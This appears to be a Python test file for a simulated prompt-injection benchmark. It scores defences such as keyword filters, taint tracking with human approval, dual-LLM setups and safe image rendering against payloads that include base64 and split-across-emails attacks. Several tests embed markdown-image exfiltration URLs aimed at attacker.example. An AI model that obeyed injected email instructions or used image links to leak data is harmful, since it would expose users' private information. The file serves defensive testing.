import unittest

from main import (DEFENCES, PAYLOADS, Defence, ObedientModel, World, attempt, fill, plan_from_task, render,
                  run_agent, score)

BY_NAME = {d.name: d for d in DEFENCES}


class WorldTests(unittest.TestCase):
    def test_rendering_an_image_is_a_request(self):
        w = World({})
        render("hi ![x](https://attacker.example/a?d=1)", w)
        self.assertTrue(w.attacker_reached())

    def test_safe_render_drops_unknown_hosts_and_keeps_allowed(self):
        w = World({})
        out = render("![a](https://attacker.example/x) ![b](https://corp.example/logo.png)", w, ("corp.example",))
        self.assertIn("[image removed]", out)
        self.assertEqual(w.rendered, ["https://corp.example/logo.png"])

    def test_fill_url_encodes_inside_urls(self):
        self.assertEqual(fill("https://a/?d=$LAST", "a b"), "https://a/?d=a%20b")
        self.assertEqual(fill("$LAST", "a b"), "a b")


class PlanTests(unittest.TestCase):
    def test_plans_from_the_users_task(self):
        self.assertEqual(plan_from_task("Summarize emails 7 and 8"), [("read_email", {"id": 7}), ("read_email", {"id": 8})])
        self.assertEqual(plan_from_task("Read email 2 and reply 'ok' to bob@corp.example")[1],
                         ("send_email", {"to": "bob@corp.example", "body": "ok"}))


class DefenceTests(unittest.TestCase):
    def test_no_defence_loses_to_every_attack(self):
        self.assertEqual(len(score(BY_NAME["none"])["attacks"]), len(PAYLOADS))

    def test_filter_catches_only_the_obvious_and_breaks_a_real_email(self):
        r = score(BY_NAME["injection filter"])
        self.assertNotIn("classic override", r["attacks"])
        self.assertIn("polite paraphrase", r["attacks"])
        self.assertIn("base64", r["attacks"])
        self.assertEqual(r["legit"], 1)                 # "please ignore the previous email" got deleted

    def test_taint_blocks_everything_and_costs_approvals(self):
        r = score(BY_NAME["taint + human approval"])
        self.assertEqual((r["attacks"], r["legit"]), ([], 2))
        self.assertGreater(r["approvals"], 0)

    def test_dual_llm_needs_safe_rendering_too(self):
        self.assertEqual(score(BY_NAME["dual LLM"])["attacks"], ["markdown image"])
        self.assertEqual(score(BY_NAME["dual LLM + safe render"])["attacks"], [])

    def test_a_human_who_approves_everything_is_no_defence(self):
        p = PAYLOADS[0]
        w = World({7: ("x@y", p.parts[0])})
        run_agent("Summarize email 7", w, ObedientModel("Summarize email 7", [p]),
                  Defence("t", taint=True), approve=lambda n, a: True)
        self.assertTrue(w.attacker_reached())

    def test_attack_needs_both_halves_of_the_split(self):
        p = next(p for p in PAYLOADS if p.name == "split across emails")
        o = attempt(BY_NAME["none"], "Summarize email 7", {7: ("x@y", p.parts[0])}, [p])
        self.assertFalse(o.world.attacker_reached())


if __name__ == "__main__":
    unittest.main()
